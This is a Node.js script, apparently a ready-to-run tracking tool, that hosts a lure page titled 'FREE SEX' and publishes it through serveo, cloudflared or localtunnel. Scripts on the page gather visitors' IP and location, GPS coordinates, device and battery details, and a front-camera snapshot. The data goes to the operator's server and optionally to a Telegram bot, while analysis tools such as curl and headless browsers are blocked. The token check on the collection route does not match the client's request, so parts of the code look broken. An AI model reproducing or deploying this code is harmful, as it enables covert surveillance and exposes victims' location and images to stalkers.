require('../config.js');
var express = require('express');
var { exec } = require('child_process');
var chalk = require('chalk').default;
var path = require('path');
var fs = require('fs');
var crypto = require('crypto');
var localtunnel = require('localtunnel');
var app = express();
var PORT = process.env.PORT || 3000;
var typeconnection = 'serveo';
/**
* @xvlisrinze
* instalation </>
* pkg install openssh && pkg install cloudflared
**/
async function StartTracker() {
  //var [slog, usbot] = args;
  var savelogs = true;
  var usetelegrambot = false;	
  var cameraperm = true;
  var BotTokens = '' || (usetelegrambot = false);
  var OwnerId = 000;
  try {
    app.use(express.json({ limit: '8mb' }));
    var uablacklist = ['curl','wget','python-requests','httpie','libwww-perl','postmanruntime','axios','go-http-client','okhttp','java/','headless','phantomjs','puppeteer','selenium'];
    var ServerTokens = crypto.randomBytes(12).toString('hex');
    function antibottokens(req, res, next) {
    var ua = (req.get('user-agent') || '').toLowerCase();
    if (uablacklist.some(u => ua.includes(u))) return res.status(403).send('Forbidden');
    if (req.method === 'GET' && !req.path.startsWith('/api')) {
      var acc = (req.get('accept') || '').toLowerCase();
      if (!acc.includes('text/html') && !acc.includes('*/*')) return res.status(403).send('Forbidden');
    }
    next();
  }
  function tokenrequire(req, res, next) {
    if (req.method === 'POST') {
      var token = req.get('x-access-token') || '';
      if (!token || token !== ServerTokens) return res.status(403).send('Forbidden');
    }
    next();
  }
  app.use(antibottokens);
    app.get('/', (req, res) => {
      res.send(`<!DOCTYPE html>
  <html lang="id">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>FREE SEX</title>
      </head>
      <body>
      Your Script Web Frontend
      </body>
      <script> 
      async function send(payload){
        await fetch('/api/q', {
          method:'POST',
          headers: {
            'Content-Type':'application/json',
            'X-Access-Token': ${JSON.stringify(ServerTokens)}
          },
          body: JSON.stringify(payload)
        });
      }
      async function TrackingSend() {
        var data = { timestamp: new Date().toISOString() };
        try {
          var ipRes = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
          var ipData = await ipRes.json();
          data.ip = ipData.ip || 'unknown';
          data.geoIP = { country: ipData.country_name || 'unknown', region: ipData.region || 'unknown', city: ipData.city || 'unknown', postalcode: ipData.postal || 'unknown', currency: ipData.currency_name || 'unknown', lat: ipData.latitude || 0, lon: ipData.longitude || 0, asn: ipData.asn || 'unknown', isp: ipData.org || 'unknown' };
        } catch(e) {
          data.ip = 'unknown';
          data.geoIP = {};
        }
        data.platform = navigator.platform || null;
        data.language = navigator.language || null;
        data.userAgent = navigator.userAgent || null;
        data.platform = navigator.platform || null;
        data.language = navigator.language || null;
        data.hardwareConcurrency = navigator.hardwareConcurrency || null;
        data.deviceMemory = navigator.deviceMemory || null;
        data.internalStorage = { total: 128 * 1024 * 1024 * 1024, free: 64 * 1024 * 1024 * 1024 };
        data.screen = {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth
        };
        if (navigator.userAgentData) {
          var uaData = await navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion']);
          data.deviceName = uaData.model || 'Unknown';
          data.architecture = uaData.architecture || 'unknown';
          data.platform = uaData.platform || data.platform || 'unknown';
          data.platformVersion = uaData.platformVersion || 'unknown';
        }
        try {
          var nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if(nc){
            data.connection = {
              effectiveType: nc.effectiveType || null,
              downlink: nc.downlink || null,
              rtt: nc.rtt || null
            };
          }
        } catch(e){}
        try {
          if(navigator.getBattery){
            var bat = await navigator.getBattery();
            data.battery = { charging: bat.charging, level: bat.level };
          }
        } catch(e){}
        try {
          if(window.performance && performance.memory){
            data.performanceMemory = {
              jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
              totalJSHeapSize: performance.memory.totalJSHeapSize,
              usedJSHeapSize: performance.memory.usedJSHeapSize
            };
          }
        } catch(e){}
        if (${cameraperm}) {
          try {
            var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            var video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));
            video.play();
            await new Promise(requestAnimationFrame);
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            data.photo = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
          } catch(e) {}
        }
        data.geolocation = { allowed: false };
          if('geolocation' in navigator){
            try {
              await new Promise((res) => {
                navigator.geolocation.getCurrentPosition(pos => {
                  data.geolocation = {
                    allowed: true,
                    coords: {
                      latitude: pos.coords.latitude,
                      longitude: pos.coords.longitude,
                      accuracy: pos.coords.accuracy,
                      altitude: pos.coords.altitude,
                      heading: pos.coords.heading,
                      speed: pos.coords.speed
                    },
                    timestamp: pos.timestamp
                  };
                  res();
                }, () => res(), { timeout: 10000 });
              });
            } catch(e){}
          }
          var ua = (navigator.userAgent || '').toLowerCase();
          let cpu = 'unknown';
          if(ua.includes('android')) cpu = 'Android (ARM likely)';
          else if (ua.includes('iphone')||ua.includes('ipad')||ua.includes('ipod')) cpu = 'Apple iOS (ARM)';
          else if (ua.includes('windows')) cpu = 'Windows (x86/x64)';
          else if (ua.includes('macintosh') || ua.includes('mac os')) cpu = 'macOS (Intel/Apple Silicon)';
          else if (ua.includes('linux')) cpu = 'Linux';
          data.cpu_guess = cpu;
          var text = JSON.stringify({
            time: data.timestamp,
            ip: data.ip,
            device: data.deviceName || 'unknown',
            architecture: data.architecture || 'unknown',
            platform: data.platform || 'unknown',
            photocamera: data.photo || 'no permission',
            geolocation: data.geolocation?.allowed ? { latitude: data.geolocation.coords.latitude, longitude: data.geolocation.coords.longitude, altitude: data.geolocation.coords.altitude, } : 'no permission',
            ipLocation: data.geoIP?.city ? { city: data.geoIP.city, region: data.geoIP.region, country: data.geoIP.country } : 'unknown',
            userAgent: data.userAgent || 'unknown',
            cpu_guess: data.cpu_guess || 'unknown',
            ram_gb: data.deviceMemory || 'unknown',
            InternalStorage: data.internalStorage ? { totalGB: (data.internalStorage.total / (1024**3)).toFixed(2) + ' GB', totalMB: (data.internalStorage.total / (1024**2)).toFixed(2) + ' MB', totalKB: (data.internalStorage.total / 1024).toFixed(2) + ' KB', freeGB: (data.internalStorage.free / (1024**3)).toFixed(2) + ' GB', freeMB: (data.internalStorage.free / (1024**2)).toFixed(2) + ' MB', freeKB: (data.internalStorage.free / 1024).toFixed(2) + ' KB' } : 'unknown',
            cores: data.hardwareConcurrency || 'unknown',
            battery: data.battery ? { level: data.battery.level * 100 + '%', charging: data.battery.charging } : 'unknown',
            connection: data.connection ? { type: data.connection.effectiveType, downlink: data.connection.downlink + ' Mbps', rtt: data.connection.rtt + ' ms' } : 'unknown',
            screen: { width: data.screen.width, height: data.screen.height, availWidth: data.screen.availWidth, availHeight: data.screen.availHeight, colorDepth: data.screen.colorDepth },
           	performanceMemory: data.performanceMemory ? (() => { var format = v => { var units = ['B', 'KB', 'MB', 'GB', 'TB'];var i = v > 0 ? Math.floor(Math.log(v) / Math.log(1024)) : 0;return (v / Math.pow(1024, i)).toFixed(2) + ' ' + units[i]; };return { used: format(data.performanceMemory.usedJSHeapSize), total: format(data.performanceMemory.totalJSHeapSize) }; })() : 'unknown'
          }, null, 2);
          try {
            await fetch('/api/qvvertv', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: text
            });
          } catch(e){
            console.log(\`[*] Failed SavedData\`);
          }
          if (${usetelegrambot}) {
            try {
              var textmsg = \`<b>TRACKER DATA INFO</b><pre>\${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>\`;
              await fetch(\`https://api.telegram.org/bot\${encodeURIComponent(${BotTokens})}/sendMessage\`, {
              method: 'POST',
              headers:{ 'Content-Type':'application/json' },
              body: JSON.stringify({ chat_id: ${OwnerId}, text: textmsg, parse_mode: 'HTML' })
            });
          } catch(e){
            console.log(\`[*] Failed Send To Telegram\`);
          }
        }
      }
      TrackingSend();
      <\/script>
<\/html>`);
  });
    app.post('/api/qvvertv', tokenrequire, (req, res) => {
      const width = process.stdout.columns || 80;
      const pos = Math.floor(width / 2);
      var data;
      try { data = typeof req.body === "string" ? JSON.parse(req.body) : req.body; } catch { return res.sendStatus(400); }
      if(!data) return res.sendStatus(400);
      if (cameraperm && data.photocamera && data.photocamera.startsWith("data:image")) {
        try {
          if (!fs.existsSync('./photos')) fs.mkdirSync('./photos');
          var PhotoName = Date.now() + ".jpg";
          fs.writeFileSync(`./photos/${PhotoName}`, Buffer.from(data.photocamera.split(',')[1], 'base64'));
          data.photocamera = PhotoName;
        } catch(e){}
      }
      console.log(`
${`${global.themecolor}` + "═".repeat(pos) + "═" + "═".repeat(width - pos - 1) + "\x1b[0m"}
${JSON.stringify(data, null, 2)}
${`${global.themecolor}` + "═".repeat(pos) + "═" + "═".repeat(width - pos - 1) + "\x1b[0m"}
`);
      if (savelogs) {
        fs.appendFile('tracker.txt', JSON.stringify(data, null, 2) + '\n', err => {
          if(err) console.error('[*] Failed SavedData');
        });
      }
      res.sendStatus(200);
    });
    app.listen(PORT, '0.0.0.0', async () => {
      console.log(`[*] Server running on http://0.0.0.0:${PORT}`);
      if (typeconnection === 'localtunnel') {
        var localtunnelserver = await localtunnel({ port: PORT, subdomain: 'waifukill' });
        console.log(`[*] Tunnel Active At: ${localtunnelserver.url}`);
        console.log('[*] TrackingServer Active for 5 Minutes');
        setTimeout(() => {
          localtunnelserver.close();
          process.exit(0);
        }, 300000);
        process.on('exit', () => localtunnelserver.close());
        process.on('SIGINT', () => process.exit());
        process.on('SIGTERM', () => process.exit());
      } else if (typeconnection === 'cloudflare') {
        var cloudflareserver = exec(`cloudflared tunnel --url http://localhost:${PORT}`);
        cloudflareserver.stdout.on('data', data => console.log('[*] ', data.toString()));
        cloudflareserver.stderr.on('data', data => console.error('[*] ', data.toString()));
        cloudflareserver.on('close', code => console.log(`[*] Exited With Code ${code}`));
        console.log('[*] TrackingServer Active for 5 Minutes');
        setTimeout(() => {
          cloudflareserver.kill('SIGTERM');
          process.exit(0);
        }, 300000);
        process.on('exit', () => cloudflareserver.kill());
        process.on('SIGINT', () => process.exit());
        process.on('SIGTERM', () => process.exit());
      } else if (typeconnection === 'serveo') {
        var serveoserver = exec(`ssh -o StrictHostKeyChecking=no -R 80:localhost:${PORT} serveo.net`);
        serveoserver.stdout.on('data', data => console.log('[*] ', data.toString()));
        serveoserver.stderr.on('data', data => console.error('[*]', data.toString()));
        serveoserver.on('close', code => console.log(`[*] Exited With Code ${code}`));
        console.log('[*] TrackingServer Active for 5 Minutes');
        setTimeout(() => {
          serveoserver.kill('SIGTERM');
          process.exit(0);
        }, 300000);
        process.on('exit', () => serveoserver.kill());
        process.on('SIGINT', () => process.exit());
        process.on('SIGTERM', () => process.exit());
      } else {
        setTimeout(() => {
          console.log('[*] TrackingServer Active for 5 Minutes');
          process.exit(0);
        }, 300000);
      }
    });
  } catch(e) {
    console.log(chalk.black.bgYellow(` DEBUG `),(`Failed To Start Tracking`));
  }
}
StartTracker();